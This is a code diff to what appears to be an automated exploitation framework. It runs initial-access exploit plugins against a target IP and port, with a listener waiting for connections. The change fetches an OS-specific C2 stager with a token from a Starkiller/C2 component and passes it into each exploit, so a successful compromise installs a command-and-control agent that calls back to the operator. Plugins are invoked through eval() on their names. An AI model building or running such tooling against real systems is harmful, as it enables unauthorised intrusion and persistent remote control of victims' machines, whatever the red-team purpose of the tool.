@@ -30,7 +30,8 @@ def read_plugins_configs() -> dict:
                 'extrainfo' : config['DEFAULT']['extrainfo'],
                 'http_title' : config['DEFAULT']['http-title'],  
                 'CVE' : config['DEFAULT']['CVE'], 
-                'CVSSv3' : config['DEFAULT']['CVSSv3'] 
+                'CVSSv3' : config['DEFAULT']['CVSSv3'],
+                'OS' : config['DEFAULT']['OS'] 
             }
     return configs
 
@@ -57,13 +58,14 @@ def listener(listener_port: int, listener_address: str, compromission_recap_file
         sock.close()
 
 
-def run_initial_access_plugin(plugin_name: str, plugin_config:list, target_ip: str, target_port: int, local_ip: str, local_port: int, compromission_recap_file_name: str) -> None:
+def run_initial_access_plugin(plugin_name: str, plugin_config:list, target_ip: str, target_port: int, local_ip: str, local_port: int, compromission_recap_file_name: str, token: str) -> None:
     """
     Run an initial access plugin
     """
     try:
         print('[+] Running plugin {}'.format(plugin_name))
-        res = eval(plugin_name).exploit(target_ip, target_port, local_ip, local_port)
+        rs = c2.get_stager(safe_get(plugin_config, 'OS'), token)
+        res = eval(plugin_name).exploit(target_ip, target_port, local_ip, local_port, rs)
         if res is True:
             ('[+] Exploit was successful !')
             if compromission_recap_file_name:
@@ -111,7 +113,6 @@ def main() -> None | str:
 
     # deploy c2 and start client
     c2_infos = c2.c2()
-    print('[+] C2 token : {0}'.format(c2_infos[1]))
     c2.starkiller()
 
     if args.local_ip == None:
@@ -139,7 +140,7 @@ def main() -> None | str:
                 target_port = i['port']
                 listener_process = Process(target=listener, args = (args.local_port, LOCAL_IP, args.output))
                 listener_process.start()
-                exploit_process = Process(target=run_initial_access_plugin, args = (plugin_name, values, args.target_ip, target_port, LOCAL_IP, args.local_port, args.output))
+                exploit_process = Process(target=run_initial_access_plugin, args = (plugin_name, values, args.target_ip, target_port, LOCAL_IP, args.local_port, args.output, c2_infos[1]))
                 exploit_process.start()
                 listener_process.join()
                 exploit_process.join()
